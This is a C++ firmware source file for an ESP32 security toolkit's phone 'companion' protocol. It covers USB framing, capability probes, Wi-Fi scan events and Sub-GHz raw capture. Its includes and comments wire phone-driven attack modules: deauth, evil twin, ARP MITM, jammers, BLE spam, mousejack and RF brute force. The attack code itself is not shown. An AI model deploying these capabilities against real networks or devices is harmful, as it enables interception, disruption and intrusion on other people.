#include "companion.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/serialcmds.h" // serialcmdsTaskHandle
#include "modules/others/qrcode_menu.h" // qrcode_display
#include "core/sd_functions.h"       // getFsStorage
#include "modules/rf/rf_utils.h"    // setup_rf_rx, initRfModule, RMT types
#include "modules/wifi/deauther.h"  // runDeauthBounded (phone-driven Wi-Fi deauth)
#include "modules/wifi/jam_detect.h" // jam_detect_run (headless deauth-flood detector; self-guards on lite)
#include "modules/pwnagotchi/pwnagotchi.h" // brucegotchi_run_headless (headless handshake-collecting gotchi)
#include "modules/wifi/karma_attack.h"      // karma_run_headless (headless karma / evil-twin lure)
#include "modules/wifi/brucia_responder.h"  // responder_run (headless LLMNR/NBT-NS responder)
#if !defined(LITE_VERSION)
#include <BleKeyboard.h> // self-contained BLE HID (presenter / keyboard) driven from the phone
#include <keys.h>        // KEY_* constants for the presenter keys
#endif
#include "modules/wifi/netcut.h"    // runArpSpoofBounded (phone-driven ARP MITM)
#include "modules/wifi/evil_portal.h" // EvilPortal (phone-driven captive-portal / evil twin)
#include "core/utils.h"             // getBattery
#include "core/settings.h"          // setBrightness
#include "core/led_control.h"       // setLedColor
#include "modules/ble/ble_spam.h"   // runBleSpamBounded (phone-driven BLE spam)
#if !defined(LITE_VERSION)
// BLE Suite one-shot media-control hijack. The full BLE_Suite.h drags in a large header set and
// redefines scan macros, so forward-declare just the headless entry we call (NimBLEAddress is
// already in scope via NimBLEDevice.h above). Defined in modules/ble/BLE_Suite.cpp (non-lite).
bool runMediaCommandHijackHeadless(NimBLEAddress target);
#endif
// Bad BLE (Ducky over BLE HID). ducky_typer / its BleKeyboard dep and the PSRAM-FS
// helper are both dropped from LITE builds, so the include and the runner below are
// LITE-guarded; the dispatch falls back to a 501 on lite.
#if !defined(LITE_VERSION)
#include "modules/badusb_ble/ducky_typer.h"  // ducky_startKb / key_input / safeCleanupDuckyBLE
#include "core/serial_commands/helpers.h"    // _setupPsramFs (+ PSRamFS) to stage the script
#include "modules/others/ibutton.h"          // ibutton_read_headless / ibutton_write_headless
#endif
// BruceJS interpreter (script_run). The whole module is dropped on lite builds and when
// the interpreter is explicitly disabled, so both the include and the runner are guarded;
// the dispatch falls back to a 501 otherwise.
#if !defined(LITE_VERSION) && !defined(DISABLE_INTERPRETER)
#include "modules/bjs_interpreter/interpreter.h" // run_bjs_script_headless + bjs_capture_*
#endif
#include <time.h>     // clock_get / clock_set (gmtime_r, strftime, mktime)
#include <sys/time.h> // settimeofday
#include "modules/wifi/wifi_atks.h" // capture_handshake_bounded / capture_pmkid_bounded
// MIFARE key-dictionary check (phone-driven). NOTE: ST25R3916.h must precede PN532.h -
// PN532.h pulls in Adafruit_PN532.h, which #defines FELICA_CMD_POLLING and would clobber
// the rfal enum of the same name (same ordering as rfid_commands.cpp).
#if !defined(LITE_VERSION)
#include "modules/rfid/ST25R3916.h"
#endif
#include "modules/rfid/PN532.h"
#include "modules/rfid/RFID2.h"
#include "modules/rfid/rfid125.h"   // RFID125 (headless 125 kHz LF read)
#include "modules/rfid/srix_tool.h" // SRIXTool (headless SRIX/ST25TB read)
#include "modules/rfid/RFIDInterface.h"
#include "modules/rfid/apdu.h" // Ndef::mimeRecord (NDEF contact / vCard record) - links on all boards
#if !defined(LITE_VERSION)
#include "modules/rfid/emv_reader.hpp" // headless EMV read (EMVReader::readMaskedSummary); lite drops EMV
#endif
#include "core/wifi/wifi_common.h"  // ensureWifiPlatform (station sniffer)
#include "core/wifi/wifi_mac.h"     // generateRandomMAC / validateMACFormat (Change MAC parity)
#include <esp_wifi.h>               // esp_wifi_set_mac / WIFI_IF_STA
#include <esp_wifi.h>                 // promiscuous mode (station sniffer)
#include <NimBLEDevice.h>              // BLE scan
#include <ArduinoJson.h>
#include <SerialDevice.h>
#include <WiFi.h>
#include <globals.h> // serialCli, serialDevice

// Brucia companion optional onboard-radio/sensor features. Each is compiled only
// on boards that have the hardware, so boards lacking it still LINK (the command /
// stream then reports "not available"). FM needs both the Si4713 pin macro AND a
// non-lite build, because fm.cpp/fm.h are gated by LITE_VERSION (a lite build on an
// FM board drops the Si4713 driver, so fm_tx_companion would not be defined).
#if defined(FM_SI4713) && !defined(LITE_VERSION)
#define COMPANION_HAS_FM 1
#include "modules/fm/fm.h"  // Si4713 FM transmitter (fm_tx_companion / fm_stop)
#include "driver/i2s_std.h" // I2S TX feeding the Si4713 digital audio input (fm_audio_*)
#endif
// The PDM/I2S microphone (see modules/others/mic.cpp) is gated by MIC_SPM1423 /
// MIC_INMP441; reuse its exported mic_capture_samples() plus the FFT library.
#if defined(MIC_SPM1423) || defined(MIC_INMP441)
#define COMPANION_HAS_MIC 1
#include "modules/others/mic.h"
#include <fft.h>
#include <cmath>
#endif
// Onboard I2S speaker (NS4168 / MAX98357A). Reuses modules/others/audio.cpp: playTone()
// (a synthesized square-wave tone streamed to I2S) and playAudioFile() (WAV/MP3/... decode
// to I2S, the same engine the audio_player UI uses). audio.cpp compiles ONLY under
// HAS_NS4168_SPKR, so both this include and the speaker command handlers are guarded; boards
// without the onboard speaker still LINK and reply ok:false "no speaker".
#if defined(HAS_NS4168_SPKR)
#include "modules/others/audio.h" // playTone / playAudioFile / PLAYBACK_BLOCKING
#endif
// FM digital-audio TX reuses the board's I2S speaker pins (BCLK/WCLK/DOUT) and a second I2S
// peripheral (I2S_NUM_1), so it compiles only when BOTH the FM driver and the onboard speaker
// pins exist. Boards with FM but no speaker pins (e.g. arduino-nesso-n1, esp32-c5-tft) still
// LINK and reply ok:false "no FM audio route on this board"; plain fm_tx/fm_stop still work.
#if defined(COMPANION_HAS_FM) && defined(HAS_NS4168_SPKR)
#define COMPANION_HAS_FM_AUDIO 1
#endif
// ESP-NOW broadcast (the "Connect" feature). Reuses the Connect module's EspConnection::Message
// wire struct and mirrors esp_connection.cpp's send path (WiFi STA + esp_now_init + broadcast
// peer + esp_now_send), so a Bruce device running Connect receive picks the message up. The
// Connect module is dropped on lite builds, so the include and the handler are guarded (501 on lite).
#if !defined(LITE_VERSION)
#include "core/connect/esp_connection.h" // EspConnection::Message + ESP_DATA_SIZE (ESP-NOW wire format)
#include <esp_now.h>                      // esp_now_init / esp_now_add_peer / esp_now_send
#endif
// Capability detection (CAPS): runtime I2C probes for optional peripherals.
#include "core/i2c_finder.h" // check_i2c_address() - PN532 (NFC) and Si4713 (FM) probes
// NRF24 (2.4GHz) companion features: channel-activity scan + ESB sniff. Compiled only on
// boards that wire an nRF24 over SPI; the command handlers still LINK on other boards (they
// reply "no NRF24 module"). A quick runtime probe (companionNrf24Present) also confirms a
// module is actually attached before any scan/sniff runs, and backs caps.nrf24.
#if defined(USE_NRF24_VIA_SPI)
#define COMPANION_HAS_NRF24 1
#include "core/bus_HAL.h"             // acquireSPIBus (silent SPI bring-up for the probe)
#include "modules/NRF24/nrf_common.h" // NRFradio, nrf_start, NRF24_MODE
#include "modules/NRF24/nrf_jammer.h" // nrf_jammer_headless (bounded 2.4GHz jammer)
#if !defined(LITE_VERSION)
#include "modules/NRF24/nrf_mousejack.h" // nrf_mousejack_headless (scan + inject); lite drops it
#endif
#endif
// CC1101 sub-GHz spectrum sweep (companion stream "subghz.spectrum"). Compiled only on boards
// that wire a CC1101 over SPI; others still LINK (the stream replies "no CC1101"). Reuses the
// RSSI-per-frequency read from modules/rf/rf_waterfall.cpp (setMHZ -> getRssi). Shares the single
// CC1101 with the subghz.raw stream, so the two are mutually exclusive (like wifi.sta vs wifi.ap).
#if defined(USE_CC1101_VIA_SPI)
#define COMPANION_HAS_CC1101 1
#include "modules/rf/emit.h"      // rf_raw_emit (replay a captured raw waveform)
#include "modules/rf/rf_send.h"   // sendRfCommand (RAW edge-list TX via the RMT encoder)
#include "modules/rf/rf_jammer.h" // RFJammer (headless, bounded Sub-GHz jammer)
#include "modules/rf/rf_bruteforce.h" // rf_bruteforce_headless (bounded Sub-GHz brute force)
#include "modules/rf/structs.h"   // RawRecording / RfCodes
#endif

// IR (onboard on these boards): companion parity for TV-B-Gone, learn (RX) and raw replay.
// Compiled only on boards that declare IR RX/TX pins; the handlers still LINK on boards
// without IR (they reply ok:false "no IR"). Reuses Bruce's own IR code: runTvBGoneHeadless()
// (a headless, bounded wrapper over the TV-B-Gone code tables), IrRead::loop_headless() (the
// same decode path the `ir rx` CLI uses) and sendRawCommand() (the `ir tx_raw` send path).
#if defined(RXLED) || defined(IR_RX_PINS) || defined(IR_TX_PINS)
#define COMPANION_HAS_IR 1
#include "modules/ir/TV-B-Gone.h" // runTvBGoneHeadless (bounded power-off blast)
#include "modules/ir/custom_ir.h" // sendRawCommand (raw IR replay)
#include "modules/ir/ir_read.h"   // IrRead::loop_headless (learn one code)
#include "modules/ir/ir_jammer.h" // ir_jammer_headless (bounded IR jammer)
#endif

// LoRa (SX127x / SX126x over SPI): companion parity for the LoRa chat radio. Compiled only on
// boards that declare a LoRa chip-select pin (LORA_CS) AND a non-lite build, because the whole
// LoRa module (modules/lora/LoRaRF.cpp, RadioLib) is gated by LITE_VERSION. Boards without a LoRa
// radio (e.g. T-Embed CC1101, CYD) still LINK and reply ok:false "no LoRa module". Reuses the
// module's headless helpers (lora_companion_begin/send/poll) over its RadioLib driver.
#if defined(LORA_CS) && !defined(LITE_VERSION)
#define COMPANION_HAS_LORA 1
#include "modules/lora/LoRaRF.h"
#endif

// Ethernet (W5500 over SPI): companion parity for the on-device Ethernet menu. Compiled only on
// boards that wire a W5500 (USE_W5500_VIA_SPI) AND a non-lite build, because the Ethernet module
// (modules/ethernet/EthernetHelper.cpp) is gated by LITE_VERSION. Boards without the wiring still
// LINK and reply ok:false "no Ethernet". A quick runtime SPI probe (companionW5500Present) reads
// the W5500 VERSIONR register to confirm a module is actually attached, and backs caps.eth - so a
// board wired for the QWIIC port but with nothing plugged in (e.g. T-Embed CC1101) reports false.
#if defined(USE_W5500_VIA_SPI) && !defined(LITE_VERSION)
#define COMPANION_HAS_ETH 1
#include "core/bus_HAL.h"                       // acquireSPIBus (silent SPI bring-up for the probe)
#include "modules/ethernet/DHCPStarvation.h"   // headless DHCP-starvation flood
#include "modules/ethernet/EthernetHelper.h" // W5500 init/link/IP (ETH.begin via EthernetHelper)
#include "modules/ethernet/MACFlooding.h"      // headless MAC-flooding flood
#include <ETH.h>                                // ETH global: localIP/gatewayIP/subnetMask/linkUp
#endif

// ---------------------------------------------------------------------------
// Brucia companion protocol v0 (see proto/PROTOCOL.md).
// Framing: uint32 little-endian payload length, then <length> bytes of payload.
// Payload: a JSON object envelope {v, t, id, d}.
// ---------------------------------------------------------------------------

static const uint32_t BRUCIA_PROTO_VERSION = 0;
static const uint32_t COMPANION_MAX_FRAME = 8192;

// Set by the `companion` CLI command; polled by the main loop (see companion.h).
volatile bool g_enterCompanionRequested = false;

enum CompanionKind : uint8_t {
    MSG_HELLO = 1,
    MSG_CAPS = 2,
    MSG_CMD = 3,
    MSG_ACK = 4,
    MSG_ERR = 5,
    MSG_EVENT = 6,
    MSG_DATA = 7,
    MSG_SUB = 8,
    MSG_PING = 9,
    MSG_PONG = 10,
};

#if defined(DEVICE_NAME)
#define COMPANION_BOARD_NAME DEVICE_NAME
#else
#define COMPANION_BOARD_NAME "unknown"
#endif

#if defined(BRUCE_VERSION)
#define COMPANION_FW_VERSION BRUCE_VERSION
#else
// Bump this with each firmware release so the app's Device info shows whether a reflash took
// (old firmware reports an older value / "dev"; a successful flash shows this).
#define COMPANION_FW_VERSION "brucia-0.8.3"
#endif

static const char *companionChip() {
#if defined(CONFIG_IDF_TARGET_ESP32S3)
    return "esp32-s3";
#elif defined(CONFIG_IDF_TARGET_ESP32C6)
    return "esp32-c6";
#elif defined(CONFIG_IDF_TARGET_ESP32C5)
    return "esp32-c5";
#elif defined(CONFIG_IDF_TARGET_ESP32C3)
    return "esp32-c3";
#else
    return "esp32";
#endif
}

// A SerialDevice sink that discards everything. Used to keep the framed channel
// clean while routing a CMD through the existing text-oriented CLI.
// NOTE (F1 limitation): a few legacy CLI commands print to `Serial` directly
// instead of `serialDevice`; those still leak into the stream until the CLI gains
// a proper output-capture path. The handshake (HELLO/CAPS/PING) is always clean.
class CapturingSerialDevice : public SerialDevice {
public:
    explicit CapturingSerialDevice(String &buffer) : buf(buffer) {}
    size_t println(const String &s) override { append(s); append("\n"); return 0; }
    size_t println(size_t n) override { append(String(n)); append("\n"); return 0; }
    size_t println(uint32_t n) override { append(String(n)); append("\n"); return 0; }
    size_t println() override { append("\n"); return 0; }
    size_t println(int n, int format) override { append(String(n, format)); append("\n"); return 0; }
    size_t print(int n, int format) override { append(String(n, format)); return 0; }
    size_t print(const String &s) override { append(s); return 0; }
    void vprintf(const char *fmt, va_list args) override {
        char tmp[256];
        vsnprintf(tmp, sizeof(tmp), fmt, args);
        append(tmp);
    }
    int read() override { return -1; }
    size_t write(uint8_t *str, size_t size) override {
        for (size_t i = 0; i < size && buf.length() < CAP; i++) buf += (char)str[i];
        return size;
    }
    void flush() override {}
    int available() override { return 0; }
    String readStringUntil(char) override { return String(); }

private:
    static const int CAP = 3500; // keep the ACK within one frame
    String &buf;
    void append(const String &s) { if (buf.length() < CAP) buf += s; }
    void append(const char *s) { if (buf.length() < CAP) buf += s; }
};

// --- framing over USB-CDC (Serial) ---

static bool readExact(uint8_t *buf, size_t n, uint32_t timeoutMs) {
    uint32_t last = millis();
    size_t got = 0;
    while (got < n) {
        if (Serial.available()) {
            int c = Serial.read();
            if (c < 0) continue;
            buf[got++] = (uint8_t)c;
            last = millis();
        } else {
            if (millis() - last > timeoutMs) return false;
            delay(1);
        }
    }
    return true;
}

static bool readFrame(String &payload, uint32_t timeoutMs) {
    uint8_t lenbuf[4];
    if (!readExact(lenbuf, 4, timeoutMs)) return false;
    uint32_t len = (uint32_t)lenbuf[0] | ((uint32_t)lenbuf[1] << 8) |
                   ((uint32_t)lenbuf[2] << 16) | ((uint32_t)lenbuf[3] << 24);
    if (len == 0 || len > COMPANION_MAX_FRAME) return false;
    payload = "";
    payload.reserve(len + 1);
    uint8_t b;
    for (uint32_t i = 0; i < len; i++) {
        if (!readExact(&b, 1, timeoutMs)) return false;
        payload += (char)b;
    }
    return true;
}

// Non-blocking poll for an app-sent stop during a bounded runner (defined below, before
// companionModeUSB). Forward-declared here so handlers earlier in the file (e.g. arp_spoof) can use it.
static bool companionPollStop();

static void writeFrame(const String &payload) {
    uint32_t len = payload.length();
    uint8_t lenbuf[4] = {
        (uint8_t)(len & 0xFF),
        (uint8_t)((len >> 8) & 0xFF),
        (uint8_t)((len >> 16) & 0xFF),
        (uint8_t)((len >> 24) & 0xFF),
    };
    Serial.write(lenbuf, 4);
    Serial.write((const uint8_t *)payload.c_str(), len);
    Serial.flush();
}

static void beginEnvelope(JsonDocument &out, uint8_t kind, uint32_t id) {
    out["v"] = BRUCIA_PROTO_VERSION;
    out["t"] = kind;
    out["id"] = id;
}

static void sendEnvelope(JsonDocument &out) {
    String s;
    serializeJson(out, s);
    writeFrame(s);
}

static void sendAck(uint32_t id, bool ok) {
    JsonDocument out;
    beginEnvelope(out, MSG_ACK, id);
    out["d"]["ok"] = ok;
    sendEnvelope(out);
}

// ACK carrying a human-readable `out` string (used by the bounded command wrappers).
static void companionAckMsg(uint32_t id, bool ok, const char *out) {
    JsonDocument o;
    beginEnvelope(o, MSG_ACK, id);
    JsonObject d = o["d"].to<JsonObject>();
    d["ok"] = ok;
    d["out"] = out;
    sendEnvelope(o);
}

static void sendErr(uint32_t id, uint32_t code, const char *msg) {
    JsonDocument out;
    beginEnvelope(out, MSG_ERR, id);
    out["d"]["code"] = code;
    out["d"]["msg"] = msg;
    sendEnvelope(out);
}

static void sendPong(uint32_t id) {
    JsonDocument out;
    beginEnvelope(out, MSG_PONG, id);
    JsonObject d = out["d"].to<JsonObject>();
    d["battery"] = getBattery(); // the app pings periodically, so battery stays fresh
    sendEnvelope(out);
}

// CAPABILITY-PROBE CACHING (reboot fix).
// The NRF24 and W5500 presence probes below drive SPI. On the T-Embed CC1101 the CC1101, the
// SD card, the NRF24, the W5500 AND the TFT display all share ONE physical SPI bus (same
// SCK/MISO/MOSI pins; NRF24 and W5500 even share CS pin 44), so acquireSPIBus() hands these
// probes the DISPLAY's live SPIClass instance. The companion app retries HELLO until it gets a
// CAPS reply, so sendCaps() - and therefore these probes - would otherwise run MANY times
// back-to-back, interleaved with the status-screen redraws, churning NRFradio.begin()/powerDown
// and raw transactions on the shared display bus. That is the prime cause of the reported
// "ESP reboots while connected and returns to the main menu". Fix: probe the SPI peripherals
// EXACTLY ONCE (first call), cache the booleans, and reuse them for every later CAPS and for the
// nrf24_*/eth command gates. Hardware does not hot-plug at runtime, so a one-shot result is safe,
// and warming the cache once at companion entry (companionWarmCaps) keeps the single probe
// serialized before the redraw loop ever starts.

// Runtime NRF24 presence probe. Brings up the nRF24 SPI link and asks the chip whether it
// is really there (RF24::isChipConnected reads SETUP_AW and checks it is a sane value - a
// floating MISO on an empty socket reads back as out-of-range). Mirrors nrf_common.cpp's SPI
// bring-up but stays SILENT (no Serial.println), so running it during HELLO/CAPS never injects
// stray bytes into the framed protocol stream. Returns false on boards without an nRF24.
#if defined(COMPANION_HAS_NRF24)
static bool companionNrf24Probe() {
    if (bruceConfigPins.NRF24_bus.checkConflict(GPIO_NUM_NC)) return false; // pins unconfigured
    pinMode(bruceConfigPins.NRF24_bus.cs, OUTPUT);
    digitalWrite(bruceConfigPins.NRF24_bus.cs, HIGH);
    pinMode(bruceConfigPins.NRF24_bus.io0, OUTPUT);
    digitalWrite(bruceConfigPins.NRF24_bus.io0, LOW);
    delay(5); // let pins settle before SPI traffic
    SPIClass *spi = acquireSPIBus(
        bruceConfigPins.NRF24_bus.sck, bruceConfigPins.NRF24_bus.miso, bruceConfigPins.NRF24_bus.mosi
    );
    if (!spi) spi = &SPI;
    if (!NRFradio.begin(
            spi, rf24_gpio_pin_t(bruceConfigPins.NRF24_bus.io0),
            rf24_gpio_pin_t(bruceConfigPins.NRF24_bus.cs)
        )) {
        return false;
    }
    bool present = NRFradio.isChipConnected();
    NRFradio.powerDown(); // leave the radio idle and its CS deselected (shared bus)
    return present;
}
// Cached wrapper: probe once, reuse. See the caching note above.
static bool companionNrf24Present() {
    static bool cached = false, present = false;
    if (!cached) {
        cached = true;
        present = companionNrf24Probe();
    }
    return present;
}
#else
static bool companionNrf24Present() { return false; }
#endif

// Runtime W5500 presence probe. Brings up the W5500 SPI link and reads the chip's VERSIONR
// register (common-register offset 0x0039), which always returns 0x04 on a real W5500 (a
// floating MISO on an empty QWIIC socket reads back 0x00 / 0xFF). Mirrors companionNrf24Present:
// SILENT (no Serial.println) so it never injects stray bytes into the framed protocol during
// HELLO/CAPS. Returns false on boards without a W5500 wired or attached.
#if defined(COMPANION_HAS_ETH)
static bool companionW5500Probe() {
    if (bruceConfigPins.W5500_bus.checkConflict(GPIO_NUM_NC)) return false; // pins unconfigured
    if (bruceConfigPins.W5500_bus.cs == GPIO_NUM_NC) return false;
    pinMode(bruceConfigPins.W5500_bus.cs, OUTPUT);
    digitalWrite(bruceConfigPins.W5500_bus.cs, HIGH);
    delay(2); // let the CS settle before SPI traffic
    SPIClass *spi = acquireSPIBus(
        bruceConfigPins.W5500_bus.sck, bruceConfigPins.W5500_bus.miso, bruceConfigPins.W5500_bus.mosi
    );
    if (!spi) spi = &SPI;
    // W5500 VDM read frame: 16-bit address (0x0039) + control byte (BSB=0 common reg, RWB=0 read,
    // OM=00 VDM -> 0x00), then clock out one byte. Wrapped in begin/endTransaction so the shared
    // display/SD bus is left in a clean state (its next owner re-applies its own SPISettings).
    spi->beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
    digitalWrite(bruceConfigPins.W5500_bus.cs, LOW);
    spi->transfer(0x00);
    spi->transfer(0x39);
    spi->transfer(0x00);
    uint8_t version = spi->transfer(0x00);
    digitalWrite(bruceConfigPins.W5500_bus.cs, HIGH);
    spi->endTransaction();
    return version == 0x04;
}
// Cached wrapper: probe once, reuse. See the caching note above.
static bool companionW5500Present() {
    static bool cached = false, present = false;
    if (!cached) {
        cached = true;
        present = companionW5500Probe();
    }
    return present;
}
#else
static bool companionW5500Present() { return false; }
#endif

// Warm the (SPI) capability-probe caches ONCE, from a single serialized point. Called at
// companion entry before the status screen enters its redraw loop, so the shared-bus NRF24/W5500
// probes run exactly once and never interleave with display traffic or repeat on HELLO retries.
static void companionWarmCaps() {
    (void)companionNrf24Present();
    (void)companionW5500Present();
}

static void sendCaps(uint32_t id) {
    JsonDocument out;
    beginEnvelope(out, MSG_CAPS, id);
    JsonObject d = out["d"].to<JsonObject>();
    d["board"] = COMPANION_BOARD_NAME;
    d["chip"] = companionChip();
    d["fw"] = COMPANION_FW_VERSION;
    d["proto"] = BRUCIA_PROTO_VERSION;

    // Real per-peripheral capability detection (hybrid: compile-time board macros for onboard
    // fixed peripherals, quick runtime probes for the optional/uncertain ones). The app uses
    // this to show/hide features. wifi/ble are always present on these ESP32 targets.
    JsonObject caps = d["caps"].to<JsonObject>();
#if defined(USE_CC1101_VIA_SPI)
    // CC1101: compile-time macro. A runtime probe exists (initRfModule()->getCC1101() reads the
    // VERSION/PARTNUM register), but it draws a blocking "CC1101 not found" error dialog and
    // juggles the shared SPI bus + IO expander, so it is too disruptive to run on every HELLO.
    caps["cc1101"] = true;
#else
    caps["cc1101"] = false;
#endif
    // NFC (PN532): best-effort runtime I2C probe at PN532_I2C_ADDRESS (0x24 7-bit == 0x48>>1,
    // the address the board interface uses). CAVEAT: the T-Embed CC1101 powers the PN532 DOWN at
    // boot (powerDownNFC), so a probe can read false even though the chip is fitted; OR with the
    // configured RFID module so a present-but-sleeping PN532 still reports true.
    bool pn532Configured = (bruceConfigPins.rfidModule == PN532_I2C_MODULE) ||
                           (bruceConfigPins.rfidModule == PN532_SPI_MODULE) ||
                           (bruceConfigPins.rfidModule == PN532_I2C_SPI_MODULE);
    // Cache the two I2C reads (PN532 @0x24, Si4713 @0x63) the same way as the SPI probes: the app
    // retries HELLO until CAPS, and re-driving the I2C bus on every retry is needless churn (the
    // fuel-gauge also lives on it). Probe once, reuse. pn532Configured is re-evaluated each call
    // (cheap, no bus) so a mid-session RFID-module config change is still reflected.
    static bool i2cProbed = false, nfcI2c = false, fmI2c = false;
    if (!i2cProbed) {
        i2cProbed = true;
        nfcI2c = check_i2c_address(PN532_I2C_ADDRESS);
        fmI2c = check_i2c_address(0x63);
    }
    caps["nfc"] = nfcI2c || pn532Configured;
    // NRF24: runtime SPI presence probe (cached; false when no module is actually attached).
    caps["nrf24"] = companionNrf24Present();
    // FM (Si4713): runtime I2C probe at 0x63 (cached). Absent on the T-Embed/CYD -> fm:false.
    caps["fm"] = fmI2c;
#if defined(RXLED) || defined(IR_RX_PINS) || defined(IR_TX_PINS)
    caps["ir"] = true; // onboard IR RX/TX pins (compile-time board macros)
#else
    caps["ir"] = false;
#endif
#if defined(COMPANION_HAS_MIC)
    caps["mic"] = true; // MIC_SPM1423 / MIC_INMP441 (compile-time board macro)
#else
    caps["mic"] = false;
#endif
#if defined(HAS_NS4168_SPKR)
    caps["speaker"] = true; // NS4168 I2S speaker (compile-time board macro)
#else
    caps["speaker"] = false;
#endif
#if defined(COMPANION_HAS_LORA)
    caps["lora"] = true; // LoRa radio wired (LORA_CS) on a non-lite build (compile-time board macro)
#else
    caps["lora"] = false;
#endif
    // Ethernet (W5500): runtime SPI probe (false when no module is actually attached / not wired).
    caps["eth"] = companionW5500Present();
    caps["wifi"] = true;
    caps["ble"] = true;

    // Legacy coarse module list (kept for backward compatibility with older app builds).
    JsonArray modules = d["modules"].to<JsonArray>();
    modules.add("wifi");
    modules.add("ble");
    modules.add("rf");
    modules.add("ir");
    JsonArray transports = d["transports"].to<JsonArray>();
    transports.add("usb");
    d["mtu"] = COMPANION_MAX_FRAME;
    d["battery"] = getBattery();
    // Brucia: report the device UI theme so the app can match it (the device always wins). priColor
    // is RGB565; ledColor is 0xRRGGBB. The app re-themes its accent + flame to priColor on connect.
    d["theme"] = (uint32_t)bruceConfig.priColor;
#ifdef HAS_RGB_LED
    d["led"] = (uint32_t)bruceConfig.ledColor;
    d["ledBright"] = (int)bruceConfig.ledBright; // 0..100, so the app's slider shows the real value
    d["ledEffect"] = (int)bruceConfig.ledEffect; // 0..9
#endif
    d["bright"] = (int)bruceConfig.bright;        // screen brightness 0..100
    sendEnvelope(out);
}

static bool routeCommand(const String &cmd, String &out) {
    // Run the existing Bruce CLI with output captured, so the app can display the
    // result of any command. The CLI task is already suspended. (A few legacy
    // commands print to Serial directly; those are not captured.)
    SerialDevice *prev = serialDevice;
    CapturingSerialDevice cap(out);
    serialDevice = &cap;
    bool ok = serialCli.parse(cmd);
    serialDevice = prev;
    return ok;
}

// --- wifi.ap stream (wardriving) ---

static const char *encToStr(wifi_auth_mode_t enc) {
    switch (enc) {
        case WIFI_AUTH_OPEN: return "open";
        case WIFI_AUTH_WEP: return "wep";
        case WIFI_AUTH_WPA_PSK: return "wpa";
        case WIFI_AUTH_WPA2_PSK: return "wpa2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "wpa/wpa2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "wpa2-ent";
        case WIFI_AUTH_WPA3_PSK: return "wpa3";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "wpa2/wpa3";
        default: return "unknown";
    }
}

static void sendWifiApEvent(
    const String &bssid, const String &ssid, int ch, int rssi, const char *enc
) {
    JsonDocument out;
    beginEnvelope(out, MSG_EVENT, 0);
    JsonObject d = out["d"].to<JsonObject>();
    d["ev"] = "wifi.ap";
    JsonObject r = d["data"].to<JsonObject>();
    r["bssid"] = bssid;
    r["ssid"] = ssid;
    r["ch"] = ch;
    r["rssi"] = rssi;
    r["enc"] = enc;
    r["ts"] = (uint32_t)millis(); // device uptime; the app stamps real time + GPS
    sendEnvelope(out);
}

// --- sub-ghz raw capture (OOK): the ESP captures RMT edge timings and streams
// them; all decoding happens on the phone (see app/.../subghz). Modeled on
// src/modules/rf/record.cpp. Runs only while the "subghz.raw" stream is on.

static QueueHandle_t rfQueue = nullptr;
static rmt_channel_handle_t rfRxCh = nullptr;
static bool subRf = false;
static rmt_symbol_word_t rfItem[64];
static const float SUBGHZ_FREQ_MHZ = 433.92f;

static bool companion_rf_rx_done(
    rmt_channel_t *channel, const rmt_rx_done_event_data_t *edata, void *user_data
) {
    BaseType_t high_task_wakeup = pdFALSE;
    QueueHandle_t q = (QueueHandle_t)user_data;
    xQueueSendFromISR(q, edata, &high_task_wakeup);
    return high_task_wakeup == pdTRUE;
}

static void subghzStart() {
    if (subRf) return;
    initRfModule("rx", SUBGHZ_FREQ_MHZ);
    rfRxCh = setup_rf_rx();
    if (rfRxCh == nullptr) {
        deinitRfModule();
        return;
    }
    rfQueue = xQueueCreate(4, sizeof(rmt_rx_done_event_data_t));
    rmt_rx_event_callbacks_t cbs = {};
    cbs.on_recv_done = companion_rf_rx_done;
    rmt_rx_register_event_callbacks(rfRxCh, &cbs, rfQueue);
    rmt_enable(rfRxCh);
    rmt_receive_config_t cfg = {};
    cfg.signal_range_min_ns = 3000;
    cfg.signal_range_max_ns = 12000000;
    rmt_receive(rfRxCh, rfItem, sizeof(rfItem), &cfg);
    subRf = true;
}

static void subghzStop() {
    if (!subRf) return;
    subRf = false;
    if (rfRxCh) {
        rmt_disable(rfRxCh);
        rmt_del_channel(rfRxCh); // release the channel; the S3 has only ~4 (was leaking -> reboot)
        rfRxCh = nullptr;
    }
    if (rfQueue) {
        vQueueDelete(rfQueue);
        rfQueue = nullptr;
    }
    deinitRfModule();
}

static void subghzService() {
    if (!subRf || rfQueue == nullptr) return;
    rmt_rx_done_event_data_t rx;
    if (xQueueReceive(rfQueue, &rx, 0) != pdPASS) return;
    size_t n = rx.num_symbols;
    if (n >= 5) {
        JsonDocument out;
        beginEnvelope(out, MSG_EVENT, 0);
        JsonObject d = out["d"].to<JsonObject>();
        d["ev"] = "subghz.raw";
        JsonObject data = d["data"].to<JsonObject>();
        data["freq"] = (uint32_t)(SUBGHZ_FREQ_MHZ * 1000000.0f);
        JsonArray t = data["timings"].to<JsonArray>();
        for (size_t i = 0; i < n; i++) {
            if (rx.received_symbols[i].duration0) t.add(rx.received_symbols[i].duration0);
            if (rx.received_symbols[i].duration1) t.add(rx.received_symbols[i].duration1);
        }
        sendEnvelope(out);
    }
    rmt_receive_config_t cfg = {};
    cfg.signal_range_min_ns = 3000;
    cfg.signal_range_max_ns = 12000000;
    rmt_receive(rfRxCh, rfItem, sizeof(rfItem), &cfg);
}

// --- sub-ghz spectrum sweep (CC1101): tune the CC1101 across a frequency range reading its
//     RSSI register per step, and stream one compact EVENT ev="subghz.spectrum" per completed
//     sweep: data { start, step (both kHz), count, rssi:[dBm...] }. The RSSI-per-frequency read
//     (setMHZ -> ELECHOUSE_cc1101.getRssi, with the T-Embed shared-SPI/TFT workaround) is reused
//     from modules/rf/rf_waterfall.cpp::rf_waterfall_run(). Non-blocking: each service call sweeps
//     only a small bounded chunk of steps. Shares the CC1101 with subghz.raw -> mutually exclusive.
#if defined(COMPANION_HAS_CC1101)
#ifndef TFT_MOSI
#define TFT_MOSI -1 // boards without a defined TFT MOSI never match the shared-bus workaround
#endif
static const int SPEC_MAX = 128;   // max frequency points per sweep (one frame holds the array)
static const int SPEC_CHUNK = 8;   // steps swept per service call (keeps each call ~1ms, non-blocking)
static bool subSpec = false;
static float specFStart = 300.0f;  // MHz
static float specFStep = 1.0f;     // MHz
static int specCount = 0;
static int specIdx = 0;
static int16_t specRssi[SPEC_MAX];

static void subghzSpecStart(float fStart, float fEnd, float fStep) {
    if (subSpec) return;
